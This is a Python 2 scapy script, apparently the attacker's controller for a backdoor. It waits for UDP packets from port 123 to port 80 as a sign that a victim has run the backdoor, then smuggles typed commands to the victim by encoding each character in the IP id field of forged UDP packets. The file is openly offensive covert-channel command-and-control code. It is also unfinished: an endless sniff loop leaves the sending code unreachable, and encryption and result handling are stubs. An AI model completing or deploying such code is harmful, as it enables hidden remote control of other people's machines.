# ###################################################################
# hck.py 
# 
# main functions:
#	- get input from hacker (cmd)
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import socket
import fcntl
import struct

pw = ""
mypacket = IP()
serv_addr = "192.168.0.16"	# by default
clnt_addr = "192.168.1.8"	# by default


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


def parse_arguments():
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group()
	# group.add_argument("-i", "--net_int", action="store")
	group.add_argument("-d", "--dest_ip", action="store")
	return parser.parse_args()

def client_ran_backdoor(pkt):
	print "client ran backdoor"


def main():
	global pw
	#args = parse_arguments()

	# get network interface
	serv_addr = get_ip_address('eno1')


	# wait until client run backdoor program
	while True:
		print "Sniffing..."
		sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor)


	#if(args.dest_ip is not None):
	# store backdoor client address
	#clnt_addr = args.dest_ip   

	# ask for the password for encryption
	pw = raw_input("Set a password for encryption: ")

	# get command	
	cmd = raw_input("# ")
	# encrypt the command before sending it to victim's machine
	#enc_cmd = encrypt(cmd, pw)

	# send to victim using scapy
	# how to put random data on each field
	
	mypacket = IP()/fuzz(UDP())
	print serv_addr
	mypacket.src = serv_addr
	mypacket.dst = clnt_addr

	#print enc_cmd
	i = 0
	for c in cmd:
		mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
		print "#", i
		i = i + 1
		# send forged packet
		send(mypacket)

	# recv the result


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")